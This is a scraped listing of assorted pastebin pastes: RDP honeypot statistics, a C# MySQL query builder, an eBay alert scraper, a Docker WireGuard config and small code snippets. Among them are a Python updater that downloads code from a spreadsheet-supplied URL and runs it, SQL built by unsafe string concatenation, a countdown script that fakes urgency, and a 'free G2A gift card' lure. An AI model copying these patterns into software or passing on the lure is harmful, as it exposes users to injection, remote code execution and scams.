    ""Finland"": 22,
    ""Taiwan"": 2,
    ""The Netherlands"": 2,
    ""Bulgaria"": 8
  },
  ""account"": {
    ""hello"": 600,
    ""Test"": 38,
    ""(empty)"": 8,
    ""eMfVwdgXp"": 2,
    ""zfwfYo"": 2,
    ""KihqbH"": 2,
    ""Administr"": 30,
    ""YAiLJHvoR"": 2,
    ""OjnrFu"": 2,
    ""ntkBNa"": 2,
    ""Domain"": 14,
    ""Administrator"": 2,
    ""AsJUsRuPn"": 2,
    ""wCVuly"": 2,
    ""dNZAOz"": 2,
    ""c7sbakcm"": 8,
    ""VHNcyopSl"": 2,
    ""zZGJBZ"": 2,
    ""RzSTqQ"": 2,
    ""nmap"": 2
  },
  ""keyboard"": {
    ""Unknown"": 726
  },
  ""client_build"": {
    ""Unknown"": 726
  },
  ""client_name"": {
    ""Unknown"": 726
  },
  ""ip_type"": {
    ""hosting"": 620,
    ""Unknown"": 56,
    ""proxy"": 20,
    ""hosting & proxy"": 30
  }
}"
4Q5mMybJ,2024-06-20_stats.json,rdp_snitch,JSON,Thursday 20th of June 2024 07:15:07 PM CDT,"{
  ""ip"": {
    ""104.248.154.46"": 5,
    ""164.92.104.215"": 10,
    ""58.218.199.219"": 2,
    ""213.109.202.250"": 8,
    ""116.140.196.215"": 2,
    ""205.210.31.237"": 3,
    ""64.124.50.139"": 2,
    ""103.121.74.4"": 3,
    ""185.234.216.88"": 2,
    ""51.195.66.73"": 2,
    ""185.232.67.44"": 1,
    ""154.53.166.124"": 2,
    ""194.165.16.73"": 2,
    ""194.165.16.10"": 2,
    ""45.136.254.145"": 6,
    ""198.235.24.180"": 3,
    ""60.255.174.158"": 1,
    ""80.66.66.250"": 11,
    ""139.9.189.14"": 2,
    ""124.71.139.40"": 2,
    ""194.165.16.37"": 2,
    ""159.223.52.93"": 1,
    ""45.153.166.80"": 15,
    ""223.166.31.100"": 1,
    ""128.14.237.130"": 1,
    ""139.59.123.230"": 253,
    ""205.210.31.42"": 3,
    ""81.19.135.2"": 3,
    ""185.170.144.3"": 1,
    ""79.124.60.218"": 4,
    ""45.227.254.49"": 2,
    ""45.227.254.55"": 2,
    ""198.235.24.230"": 3,
    ""104.152.52.201"": 1
  },
  ""asn"": {
    ""AS14061"": 269,
    ""AS4134"": 2,
    ""AS208312"": 8,
    ""AS4837"": 3,
    ""AS396982"": 12,
    ""AS6461"": 2,
    ""AS134886"": 3,
    ""AS57523"": 2,
    ""AS16276"": 2,
    ""AS209132"": 1,
    ""AS62425"": 2,
    ""AS48721"": 6,
    ""AS56309"": 6,
    ""AS51765"": 11,
    ""AS55990"": 4,
    ""AS19437"": 15,
    ""AS17621"": 1,
    ""AS135377"": 1,
    ""AS209588"": 3,
    ""AS197414"": 1,
    ""AS50360"": 4,
    ""AS267784"": 4,
    ""AS14987"": 1
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 16,
    ""Chinanet"": 2,
    ""Red Byte LLC"": 8,
    ""China Unicom CHINA169 Network"": 2,
    ""Google LLC"": 12,
    ""Zayo Bandwidth"": 2,
    ""Super Sonic Broadband Pvt. Ltd"": 3,
    ""Chang Way Technologies Co. Limited"": 2,
    ""OVH SAS"": 2,
    ""IPADMIN CONTACT: noc@my-hosting.net"": 1,
    ""Mailbox Internet Hizmetleri Ltd. Sti."": 2,
    ""Flyservers S.A."": 13,
    ""Siamdata Communication Co., ltd."": 6,
    ""China Unicom China169 Network"": 1,
    ""Oy Crea Nova Hosting Solution Ltd"": 11,
    ""Huawei Cloud Service data center"": 4,
    ""Secured Servers LLC"": 15,
    ""China Unicom Shanghai Province Network"": 1,
    ""Zenlayer Inc"": 1,
    ""DIGITALOCEAN"": 253,
    ""Xhost Internet Solutions LP"": 1,
    ""Tamatiya EOOD"": 4,
    ""Rethem Hosting LLC"": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 269,
    ""Chinanet JS"": 2,
    ""Chang Way Technologies Co. Limited"": 10,
    ""China United Network Communications Corporation Limited"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""Microsoft Corporation"": 2,
    ""Super Sonic Broadband Pvt Ltd"": 3,
    ""Ali Mehmet"": 2,
    ""Agent Global Network LTD"": 1,
    ""Kuzey Veri Merkezi Anonim Sirketi"": 2,
    ""Flyservers S.A"": 6,
    ""ReadyIDC Co., Ltd"": 6,
    ""SiChuan Cable TV Network CO., LTD"": 1,
    ""Xhost Internet Solutions"": 11,
    ""Huawei Public Cloud Service"": 2,
    ""Huawei Cloud Service"": 2,
    ""Net"": 15,
    ""Unknown"": 1,
    ""UCLOUD"": 1,
    ""Alviva Holding Limited"": 3,
    ""Xhostis"": 1,
    ""Tamatiya EOOD"": 4,
    ""UAB Host Baltic"": 4,
    ""Rethem Hosting LLC"": 1
  },
  ""regionName"": {
    ""Central Singapore"": 5,
    ""California"": 22,
    ""Jiangsu"": 2,
    ""Moscow"": 10,
    ""Beijing"": 2,
    ""Virginia"": 17,
    ""Maharashtra"": 3,
    ""Hesse"": 5,
    ""Timi\u0219 County"": 1,
    ""Istanbul"": 2,
    ""Kaunas"": 6,
    ""Nonthaburi"": 6,
    ""Sichuan"": 1,
    ""Uusimaa"": 11,
    ""Guangdong"": 2,
    ""Shanghai"": 3,
    ""South West"": 254,
    ""Taiwan"": 1,
    ""North Holland"": 1,
    ""Plovdiv"": 4,
    ""Vilnius"": 4,
    ""Illinois"": 1
  },
  ""country"": {
    ""Singapore"": 259,
    ""United States"": 40,
    ""China"": 10,
    ""Russia"": 10,
    ""India"": 3,
    ""Germany"": 5,
    ""Romania"": 1,
    ""T\u00fcrkiye"": 2,
    ""Lithuania"": 10,
    ""Thailand"": 6,
    ""Finland"": 11,
    ""Taiwan"": 1,
    ""The Netherlands"": 1,
    ""Bulgaria"": 4
  },
  ""account"": {
    ""hello"": 300,
    ""Test"": 19,
    ""(empty)"": 4,
    ""eMfVwdgXp"": 1,
    ""zfwfYo"": 1,
    ""KihqbH"": 1,
    ""Administr"": 15,
    ""YAiLJHvoR"": 1,
    ""OjnrFu"": 1,
    ""ntkBNa"": 1,
    ""Domain"": 7,
    ""Administrator"": 1,
    ""AsJUsRuPn"": 1,
    ""wCVuly"": 1,
    ""dNZAOz"": 1,
    ""c7sbakcm"": 4,
    ""VHNcyopSl"": 1,
    ""zZGJBZ"": 1,
    ""RzSTqQ"": 1,
    ""nmap"": 1
  },
  ""keyboard"": {
    ""Unknown"": 363
  },
  ""client_build"": {
    ""Unknown"": 363
  },
  ""client_name"": {
    ""Unknown"": 363
  },
  ""ip_type"": {
    ""hosting"": 310,
    ""Unknown"": 28,
    ""proxy"": 10,
    ""hosting & proxy"": 15
  }
}"
E1zZcTG7,MySqlCommand,Genral,C#,Thursday 20th of June 2024 07:07:34 PM CDT,"using System;
using System.Data;
using System.Text;
using Sinaa_Project;
using MySql.Data.MySqlClient;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace AmirSQL.MySQL
{
    public class MySqlCommand : IDisposable
    {
        //private MySqlCommandType _type;
        public MySqlCommandType Type { get; set; }
        private StringBuilder _command;
        private List<MySqlParameter> _parameters = new List<MySqlParameter>();
        public List<MySqlParameter> Parameters => _parameters;
        public string Command
        {
            get => _command.ToString();
            private set => _command = new StringBuilder(value);
        }

        private bool firstPart = true;
        private Dictionary<byte, string> insertFields;
        private Dictionary<byte, string> insertValues;
        private byte lastpair;

        public MySqlCommand(MySqlCommandType type)
        {
            Type = type;
            _command = new StringBuilder();

            switch (type)
            {
                case MySqlCommandType.SELECT:
                    _command = new StringBuilder(""SELECT * FROM <R>"");
                    break;
                case MySqlCommandType.UPDATE:
                    _command = new StringBuilder(""UPDATE <R> SET "");
                    break;
                case MySqlCommandType.INSERT:
                    insertFields = new Dictionary<byte, string>();
                    insertValues = new Dictionary<byte, string>();
                    lastpair = 0;
                    _command = new StringBuilder(""INSERT INTO <R> (<F>) VALUES (<V>)"");
                    break;
                case MySqlCommandType.DELETE:
                    _command = new StringBuilder(""DELETE FROM <R> WHERE <C> = <V>"");
                    break;
                case MySqlCommandType.COUNT:
                    _command = new StringBuilder(""SELECT count(<V>) FROM <R>"");
                    break;
            }
        }
        private bool Comma()
        {
            if (firstPart)
            {
                firstPart = false;
                return false;
            }
            return _command[_command.Length - 1] != ',';
        }

        public MySqlCommand Select(string table)
        {
            _command = _command.Replace(""<R>"", $""`{table}`"");
            return this;
        }

        public MySqlCommand Count(string table)
        {
            _command = _command.Replace(""<R>"", $""`{table}`"");
            return this;
        }

        public MySqlCommand Delete(string table, string column, object value)
        {
            _command = _command.Replace(""<R>"", $""`{table}`"")
                               .Replace(""<C>"", $""`{column}`"")
                               .Replace(""<V>"", value is string str ? $""'{str.MySqlEscape()}'"" : value.ToString());
            return this;
        }

        public MySqlCommand Update(string table)
        {
            _command = _command.Replace(""<R>"", $""`{table}`"");
            return this;
        }

        //public MySqlCommand Set(string column, object value)
        //{
        //    if (Type == MySqlCommandType.UPDATE)
        //    {
        //        if (Comma())
        //            _command.Append($"", `{column}` = {(value is byte[]? $""@{column}"" : (value is string str ? $""'{str.MySqlEscape()}'"" : value.ToString()))} "");
        //        else
        //            _command.Append($""`{column}` = {(value is byte[]? $""@{column}"" : (value is string str ? $""'{str.MySqlEscape()}'"" : value.ToString()))} "");

        //        if (value is byte[])
        //        {
        //            AddParameter($""@{column}"", value);
        //        }
        //    }
        //    return this;
        //}
        //public MySqlCommand Set(string column, object value)
        //{
        //    if (Type == MySqlCommandType.UPDATE)
        //    {
        //        string parameterPlaceholder = $""@{column}"";

        //        if (Comma())
        //        {
        //            _command.Append($"", `{column}` = {parameterPlaceholder} "");
        //        }
        //        else
        //        {
        //            _command.Append($""`{column}` = {parameterPlaceholder} "");
        //        }

        //        AddParameter(parameterPlaceholder, value);
        //    }
        //    return this;
        //}
        public MySqlCommand Set(string column, object value)
        {
            if (Type == MySqlCommandType.UPDATE)
            {
                bool isByteArray = value is byte[];
                string parameterPlaceholder = $""@{column}"";

                if (Comma())
                {
                    _command.Append($"", `{column}` = {parameterPlaceholder} "");
                }
                else
                {
                    _command.Append($""`{column}` = {parameterPlaceholder} "");
                }

                // Add the parameter to the list
                AddParameter(parameterPlaceholder, value);

                
                Program.AddError($""Set column: {column}, value: {(isByteArray ? ""byte[]"" : value.ToString())}"");
            }
            return this;
        }





        public MySqlCommand Insert(string table)
        {
            _command = _command.Replace(""<R>"", $""`{table}`"");
            return this;
        }

        public MySqlCommand Insert(string field, object value)
        {
            insertFields.Add(lastpair, $""`{field}`"");
            insertValues.Add(lastpair, value is byte[]? $""@{field}"" : (value is string str ? $""'{str.MySqlEscape()}'"" : value.ToString()));
            if (value is byte[])
            {
                AddParameter($""@{field}"", value);
            }
            lastpair++;
            return this;
        }

        //public MySqlCommand AddParameter(string name, object value)
        //{
        //    _parameters.Add(new MySqlParameter(name, value));
        //    return this;
        //}
        public MySqlCommand AddParameter(string name, object value)
        {
            if (value == DBNull.Value)
            {
                _parameters.Add(new MySqlParameter(name, value));
            }
            else if (value is byte[])
            {
                _parameters.Add(new MySqlParameter(name, MySqlDbType.Blob) { Value = value });
            }
            else
            {
                _parameters.Add(new MySqlParameter(name, value));
            }
            return this;
        }


        public MySqlCommand Where(string column, object value, bool greater = false, bool like = false)
        {
            if (like)
            {
                if (value is string stringValue)
                {
                    _command.Append($""WHERE `{column}` LIKE '{stringValue.MySqlEscape()}'"");
                }
                else
                {
                    _command.Append($""WHERE `{column}` LIKE {value}"");
                }
            }
            else
            {
                if (value is string stringValue)
                {
                    _command.Append(greater ? $""WHERE `{column}` > '{stringValue.MySqlEscape()}'"" : $""WHERE `{column}` = '{stringValue.MySqlEscape()}'"");
                }
                else
                {
                    _command.Append(greater ? $""WHERE `{column}` > {value}"" : $""WHERE `{column}` = {value}"");
                }
            }
            return this;
        }

        public MySqlCommand And(string column, object value)
        {
            _command.Append($"" AND `{column}` = {value}"");
            return this;
        }

        public MySqlCommand Or(string column, object value)
        {
            _command.Append($"" OR `{column}` = {value}"");
            return this;
        }

        public MySqlCommand Order(string column)
        {
            _command.Append($"" ORDER BY {column}"");
            return this;
        }
        public int Execute()
        {
            using (var conn = DataHolder.MySqlConnection)
            {
                conn.Open();
                return Execute(conn);
            }
        }
        public int Execute(MySqlConnection conn)
        {
            
            if (Type == MySqlCommandType.INSERT)
            {
                var fields = string.Join("","", insertFields.Values);
                var values = string.Join("","", insertValues.Values);
                _command.Replace(""<F>"", fields).Replace(""<V>"", values);
            }
            Program.AddError(""Executing Command: "" + Command); // Log the command
            using (var cmd = new MySql.Data.MySqlClient.MySqlCommand(Command, conn))
            {
                foreach (var parameter in _parameters)
                {
                    Program.AddError($""Parameter: {parameter.ParameterName}, Value: {parameter.Value}""); // Log parameters
                    cmd.Parameters.Add(parameter);
                }
                return cmd.ExecuteNonQuery();
            }
        }

        public MySqlReader CreateReader()
        {
            return new MySqlReader(this);
        }

        public void Dispose()
        {
            insertValues?.Clear();
            insertFields?.Clear();
            _command = null;
        }
    }

    public enum MySqlCommandType
    {
        DELETE, INSERT, SELECT, UPDATE, COUNT
    }

    public class MySqlReader : IDisposable
    {
        private readonly DataSet _dataset;
        private DataRow _datarow;
        private int _row;
        private const string Table = ""table"";

        public MySqlReader(MySqlCommand command)
        {
            if (command.Type == MySqlCommandType.SELECT)
            {
                _dataset = new DataSet();
                _row = 0;
                using (var conn = DataHolder.MySqlConnection)
                {
                    conn.Open();
                    using (var adapter = new MySqlDataAdapter(command.Command, conn))
                        adapter.Fill(_dataset, Table);
                }
                command.Dispose();
            }
        }

        public void Dispose()
        {
            _dataset?.Dispose();
        }

        public bool Read()
        {
            if (_dataset == null || _dataset.Tables.Count == 0 || _dataset.Tables[Table].Rows.Count <= _row)
                return false;

            _datarow = _dataset.Tables[Table].Rows[_row];
            _row++;
            return true;
        }

        public int NumberOfRows => _dataset?.Tables.Count > 0 ? _dataset.Tables[Table].Rows.Count : 0;

        public T Read<T>(string columnName)
        {
            if (_datarow.IsNull(columnName)) return default;

            var value = _datarow[columnName];
            return (T)Convert.ChangeType(value, typeof(T));
        }
    }

    public static class MySqlExtensions
    {
        public static string MySqlEscape(this string usString)
        {
            if (usString == null) return null;
            return Regex.Replace(usString, @""[\r\n\x00\x1a\\'""""]"", @""\$0"");
        }
    }

    public static class DataHolder
    {
        public static MySqlConnection MySqlConnection => new MySqlConnection(Program.connection(""db_sql"", """"));
    }
}
"
PZwmQv4E,Kartra Visit-Based Countdown Timer,briank,JavaScript,Thursday 20th of June 2024 06:51:14 PM CDT,"<script>
/*
 * A ""footer script"" to make Kartra ""fixed"" countdown timers count a fixed amount of time on each page visit.
 * Author: Brian Katzung (briank@kappacs.com)
 * Version date: 2024-06-20
 */
const counters = $('div.countdown-section[data-countdown=""fixed""]').find('div.countdown');
setTimeout(() => counters.each(function () { $(this).stopCountDown(); $(this).countDown({ targetOffset: {
year: 0, month: 0, day: 0, hour: 1, min: 30, sec: 0 // <-- adjust these as desired
}}); }), 1000);
</script>"
e1a4PSfZ,Docker Compose - Wireguard (QNAP),pablopc,YAML,Thursday 20th of June 2024 06:08:47 PM CDT,"version: '3.3'
services:
  wireguard: 
    image: masipcat/wireguard-go:latest
    container_name: wireguard
    cap_add:
     - NET_ADMIN
    sysctls:
     - net.ipv4.ip_forward=1
    volumes:
     - /dev/net/tun:/dev/net/tun
     - /share/DockerData/wireguard:/etc/wireguard
    environment:
     - WG_COLOR_MODE=always
     - LOG_LEVEL=debug
    ports:
     - 55555:51820
    privileged: true
    restart: unless-stopped"
ANsknUy1,actualizar.py,jackox,Python,Thursday 20th of June 2024 06:03:06 PM CDT,"#ItemAlert v4
#actualizar.py

import configparser
import re
import urllib.request
import subprocess

config = configparser.ConfigParser()
config.read('config.ini')
midispositivo = config['DISPOSITIVO']['ID']
url = config['GSHEET']['URL']

with urllib.request.urlopen(url) as response:
   html = response.read().decode('utf-8')

regex = r""---.*?--(.*?)--.*?---""
r1 = re.findall(regex, html)
adispositivo = r1[0]
aactualizar = r1[1]
aurl = r1[2]

print (adispositivo)
print (aactualizar)
print (aurl)

if (aactualizar == 'SI'):
    with urllib.request.urlopen(aurl) as response:
        codigo = response.read()
    with open(""itemalert.py"", ""wb"") as f:
        f.write(codigo)
        f.close()
subprocess.call(""itemalert.py"", shell=True)
#exec(open(""itemalert.py"").read())"
TRHdH43Z,itemalert4.py,jackox,Python,Thursday 20th of June 2024 05:33:07 PM CDT,"#ItemAlert v4
#itemalert4.py

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from datetime import datetime
from urllib.parse import quote
from urllib.request import urlopen

import time
import re
import configparser
import logging
import sys

def consultabd(eburl):
    import sqlite3

    con = sqlite3.connect('itemalert.db', isolation_level = None)
    cur = con.cursor()
    res = cur.execute(""CREATE TABLE IF NOT EXISTS BD (id INTEGER PRIMARY KEY,EBURL text NOT NULL)"")
    res = cur.execute(""SELECT * FROM BD WHERE EBURL='"" + eburl + ""'"")
    row = res.fetchone()
    if row is None:
        cur.execute(""INSERT INTO BD (EBURL) VALUES ('""+ eburl +""')"")
        return 0
    else:
        return 1
    con.close()

def enviadatos(micodigo,midispositivo,mensaje,desc,eburl,precio,imagen):
    from urllib.request import urlopen
    import urllib.parse
    import logging
    import sys

    try:
        url = ""https://script.google.com/macros/s/"" + micodigo + ""/exec?disp="" + str(midispositivo) + ""&mensaje="" + mensaje  + ""&desc="" + urllib.parse.quote(desc)  + ""&eburl="" + eburl  + ""&precio="" + urllib.parse.quote(precio)  + ""&imagen="" + imagen
        print(url)
        req = urlopen(url)
    except Exception:
        e = sys.exc_info()[1]
        print (e)
        pass

logging.basicConfig(filename='ia.log', filemode='a', level=logging.INFO, format='%(asctime)s :: %(levelname)s :: %(message)s')
logging.info(""Iniciando ..."")
print (""Iniciando ..."")

config = configparser.ConfigParser()
config.read('config.ini')
midispositivo = config['DISPOSITIVO']['ID']
miusuario = config['ITEMALERT']['USER']
mipass = config['ITEMALERT']['PASS']
mibusqueda = config['ITEMALERT']['SEARCH']
micodigo = config['GSHEET']['CODIGO']

options = webdriver.ChromeOptions()
options.add_argument(""--no-sandbox"")
options.add_argument(""--disable-dev-shm-usage"")
options.add_argument(""--headless=new"")
driver = webdriver.Chrome(options=options)
driver.get(""https://itemalert.com/login"")
usuario = driver.find_element(By.NAME, 'username')
pswrd = driver.find_element(By.NAME, 'password')
usuario.send_keys(miusuario)
pswrd.send_keys(mipass)
pswrd.send_keys(Keys.RETURN)
logging.info(""Logeado en itemalert"")

driver.get(""https://itemalert.com/savedsearch"")
cv = driver.find_element(By.NAME, mibusqueda)
cv.click()

go = driver.find_element(By.NAME, 'go')
driver.execute_script(""arguments[0].click();"", go)
#go.click()

email = driver.find_element(By.XPATH,'//p[@data-original-title=""new result email""]')
email.click()

eterror = driver.find_element(By.XPATH,'//div[@id=""error""]')
errorat = eterror.get_attribute('innerHTML')

logging.info(""Monitoreo iniciado, mensaje: "" + errorat)
j = 0
while True:
       symbols = str(datetime.now())
       nomimg = ""captura-"" + """".join(symbols) + "".png""
       nomimg = nomimg.replace("":"","""")
       nomimg = nomimg.replace("" "","""")
       eterror = driver.find_element(By.XPATH,'//div[@id=""error""]')
       errorat = eterror.get_attribute('innerHTML')
       errorat = re.sub(r'<[^>]*?>', '', errorat)
       errorat = errorat.replace("" "","""")
       errorat = quote(errorat)
       logging.info(""Error: "" + errorat)

       if(errorat == ""NoeBayErrors%21""):
              if(j == 15):
                  j = 1
                  print(""Enviando aviso de funcionamiento"")
                  enviadatos(micodigo,midispositivo,errorat,"""","""","""","""")
              else:
                  j += 1
              print (""ItemAlert operando sin errores: "" + str(j) + "" de 15"")
              html = driver.execute_script(""return document.body.innerHTML"")

              regex = 'l l-d"".*?>(.*?)<\/span>'#Descripciones
              descs = re.findall(regex, html)
              regex = '""p-r"" href=.*?itm\/(.*?)\?'#Clave ebay
              eburls = re.findall(regex, html)
              regex = 'Fixed Price @ (.*?) USD|Auction : (.*?) USD'#Precio
              precios = re.findall(regex, html)
              regex = 'images\/g\/(.*?)\/s-l225.jpg'#Imagen
              imagenes = re.findall(regex, html)
              length = len(descs)
              logging.info(""Registros encontrados: "" + str(length))
              for i in range(length//2):
                     desc = descs[i]
                     eburl = eburls[i]
                     precio = precios[i][0] + precios[i][1]
                     imagen = imagenes[i]
                     nregs = consultabd(eburl)
                     if nregs == 0:
                            print (""Item "" + eburl + "" NO encontrado en BD"")
                            enviadatos(micodigo,midispositivo,""Nuevo_item_encontrado:_"" + eburl,desc,eburl,precio,imagen)
                            time.sleep(5)
                     else:
                         print (""Item "" + eburl + "" encontrado en BD"")
              time.sleep(20)
       else:
              logging.info(""NO Entro al if error, error:"" + errorat)
              print(""NO Entro al if error"")
              enviadatos(micodigo,midispositivo,errorat,"""","""","""","""")
              time.sleep(300)
driver.quit()"
1kcbdkXs,itemalert4.gs,jackox,JavaScript,Thursday 20th of June 2024 05:30:53 PM CDT,"//ItemAlert v4 Google Apps Script
//itemalert4.gs

function doGet(e){
  var dispositivo = e.parameter.disp;
  var mensaje = e.parameter.mensaje;
  var desc = e.parameter.desc;
  var eburl = e.parameter.eburl;
  var precio = e.parameter.precio;
  var imagen = e.parameter.imagen;

  //Si la variable dispositivo es 1 o 2 la llamada viene de Python
  if (dispositivo==1 || dispositivo==2){
    itemalert(dispositivo,mensaje);
    iabasedatos(dispositivo,desc,eburl,precio,imagen);
    var HTMLString = ""<h1>DISPOSITIVO "" + dispositivo + "", "" + mensaje + ""</h1><br>"" + Logger.getLog();
  } else {//De los contrario la llamada viene de CronJob
    monitoreo();
    var HTMLString = ""<h1>MONITOREO</h1>"";
  }
  HTMLOutput = HtmlService.createHtmlOutput(HTMLString);
  return HTMLOutput;
}

//Funci√≥n que recibe mensajes de error o de ok para un dispositivo
//y lo almacena en la hoja del dispositivo para monitoreo por CronJob
function itemalert(dispositivo,mensaje){
  var fecha = Utilities.formatDate(new Date(), ""GMT-6"", ""MMMM dd, yyyy HH:mm:ss"");
  var libro = SpreadsheetApp.getActiveSpreadsheet();
  var hoja =libro.getSheetByName(""Dispositivo"" + dispositivo);

  hoja.appendRow([ fecha,mensaje ]);
}

//Funci√≥n que recibe los datos de una publicaci√≥n para un dispositivo
//y los almacena en la BD
function iabasedatos(dispositivo,desc,eburl,precio,imagen){
	var libro = SpreadsheetApp.getActiveSpreadsheet();
	var hojaInicio =libro.getSheetByName(""Inicio"");
	var hojaBD =libro.getSheetByName(""BD"");

  Logger.log('Punto 2');
	
	hojaInicio.getRange(16,3).setValue(desc);
	hojaInicio.getRange(17,3).setValue('https://www.ebay.com/itm/' + eburl);
	encontrado = hojaInicio.getRange(22, 3).getValue();
	
	if(encontrado=='NO'){
    aviso = hojaInicio.getRange(26, 3).getValue();
		hojaBD.appendRow([ dispositivo,desc,'https://www.ebay.com/itm/' + eburl,precio,imagen,aviso ]);
		if(aviso=='SI'){
			var mensaje = ""<p>"" + desc + ""</p>"";
			mensaje += ""<p>Precio = "" + precio + ""</p>"";
			mensaje += ""<p>Enlace = https://www.ebay.com/itm/"" + eburl + ""</p>"";
			mensaje += ""<p><img src='https://i.ebayimg.com/thumbs/images/g/"" + imagen + ""/s-l225.jpg'></p>"";
      MailApp.sendEmail({
      to: 'julio.almanza.cel@gmail.com',
      subject: 'ItemAlert:' + desc, mensaje,
      htmlBody: mensaje
    });
		}
	}
}

//Funci√≥n que recibe el monitoreo de CronJob cada determinados minutos
//para verificar que los dispositivos se encuentren funcionando correctamente
function monitoreo(){
  var libro = SpreadsheetApp.getActiveSpreadsheet();
  var hojaInicio =libro.getSheetByName(""Inicio"");
  var hojaMonitoreo =libro.getSheetByName(""Monitoreo"");
  var fecha = Utilities.formatDate(new Date(), ""GMT-6"", ""MMMM dd, yyyy HH:mm:ss"");

  monitoreoxdispositivo(1);
  monitoreoxdispositivo(2);

  Estado1 = hojaInicio.getRange(3, 5).getValue();
  Estado2 = hojaInicio.getRange(4, 5).getValue();

  //Verifica que alguno de los dos dispositivos este en l√≠nea, en caso contrario env√≠a un correo de aviso
  if(Estado1=='En linea' || Estado1=='En linea'){
    hojaMonitoreo.appendRow([ fecha,'Dispositivos funcionando correctamente' ]);
  }else{
    hojaMonitoreo.appendRow([ fecha,'Ambos dispositivos se encuentran apagados o en error' ]);
	  MailApp.sendEmail('julio.almanza.cel@gmail.com', 'ItemAlert: Apagados o con error', 'Ambos dispositivos se encuentran apagados o en error');
  }
}

//Funci√≥n para revisar el estado de cada dispositivo
function monitoreoxdispositivo(dispositivo){
  var libro = SpreadsheetApp.getActiveSpreadsheet();
  var hoja = libro.getSheetByName(""Dispositivo"" + dispositivo);
  var hojaMonitoreo =libro.getSheetByName(""Monitoreo"");
  var hojaInicio =libro.getSheetByName(""Inicio"");

  var fecha = Utilities.formatDate(new Date(), ""GMT-6"", ""MMMM dd, yyyy HH:mm:ss"");

  nuevo = hoja.getRange(1, 9).getValue();
  anterior = hoja.getRange(1, 11).getValue();
  mensaje = hoja.getRange(1, 12).getValue();

  if(nuevo>anterior && mensaje=='NoeBayErrors!'){
    hoja.getRange(1,4).setValue('En linea');
  }
  if(nuevo==anterior){
    hoja.getRange(1,4).setValue('Apagado');
  }
  if(mensaje=!'NoeBayErrors!'){
    hoja.getRange(1,4).setValue('Error');
    hojaMonitoreo.appendRow([ fecha,'Error en Dispoditivo ' + dispositivo ]);
    //Env√≠a correo para avisar del error
    MailApp.sendEmail('julio.almanza.cel@gmail.com', 'ItemAlert: Dispositivo ' + dispositivo + ' con error', 'Dispositivo ' + dispositivo + ' con error');
  }

  hoja.getRange(1,11).setValue(nuevo);

  if(nuevo>=500){
    hoja.getRange(""A1:B510"").clearContent();
    hoja.getRange(1,11).setValue(0);
  }
}"
6Haq2mQ7,üéÅG2A.com Free Gift Card Guide June 2024 V2üéÅ,ssss50ws,GetText,Thursday 20th of June 2024 05:14:52 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
21 June 2024"
y1m8FCAw,Untitled,DasBrain,Java,Thursday 20th of June 2024 04:57:11 PM CDT,"import static java.lang.invoke.MethodHandles.*;
import static java.lang.invoke.MethodType.methodType;

import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodType;

public class MethodHandleChain {
    public static void main(String[] args) {
        Class<?> rt = Object.class;
        
        MethodHandle ctor = empty(methodType(rt, String.class));
        MethodHandle read1 = empty(methodType(void.class, rt, Long.class));
        MethodHandle read2 = empty(methodType(void.class, rt, Integer.class));
        
        
        MethodHandle result = identity(rt);
        
        result = dup(collectArguments(result, 1, read2));
        result = dup(collectArguments(result, 1, read1));
        
        result = collectArguments(result, 0, ctor);
        System.out.println(result);
    }
    
    // Duplicates parameter at pos 0
    private static MethodHandle dup(MethodHandle mh) {
        MethodType mt = mh.type();
        if (mt.parameterType(0) != mt.parameterType(1)) {
            throw new IllegalArgumentException(""First 2 parameters need to have the same type, got "" + mt);
        }
        MethodType newMT = mt.dropParameterTypes(0, 1);
        int[] permutation = new int[mt.parameterCount()];
        permutation[0] = 0;
        for (int i = 0; i < newMT.parameterCount(); i++) {
            permutation[i + 1] = i;
        }
        return permuteArguments(mh, newMT, permutation);
    }
}
"
N3vvKsEN,"""Button Detection"" rev_01",pleasedontcode,Arduino,Thursday 20th of June 2024 04:36:41 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Button Detection""
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-06-20 21:35:52

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* chci kod pro kviz na webu pro mobiln√≠ telefon s 5 */
	/* ot√°zky (ot√°zky chci, aby ≈°li lehce p≈ôid√°vat), d√°le */
	/* chci ot√°zky typu a, b, c, d; d√°le ano/ne; voln√° */
	/* odpovƒõƒè. d√°le p≈ôihl√°≈°en√≠ u≈æivatelu a vyhodnoceni, */
	/* zpƒõtn√° vazba po ot√°zk√°ch */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h>  //https://github.com/evert-arias/EasyButton

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t jj_PushButton_PIN_D4 = 4;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
EasyButton button(jj_PushButton_PIN_D4); // Initialize EasyButton instance with the pin

void onButtonPressed() {
  Serial.println(""Button pressed"");
}

void setup(void)
{
  // put your setup code here, to run once:
  Serial.begin(115200);
  Serial.println();
  Serial.println("">>> EasyButton example <<<"");

  button.begin(); // Initialize the button
  button.onPressed(onButtonPressed); // Attach the callback function

  pinMode(jj_PushButton_PIN_D4, INPUT_PULLUP);
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  button.read(); // Read the button state
}

/* END CODE */"
eH04ukh3,textDuplication3D,marcusa3000,Lua,Thursday 20th of June 2024 04:20:52 PM CDT,"{
	Tools = ordered() {
		Duplicate3D1 = Duplicate3D {
			Inputs = {
				LastCopy = Input { Value = 10, },
				[""Translate.Y""] = Input {
					SourceOp = ""Duplicate3D1YOffset"",
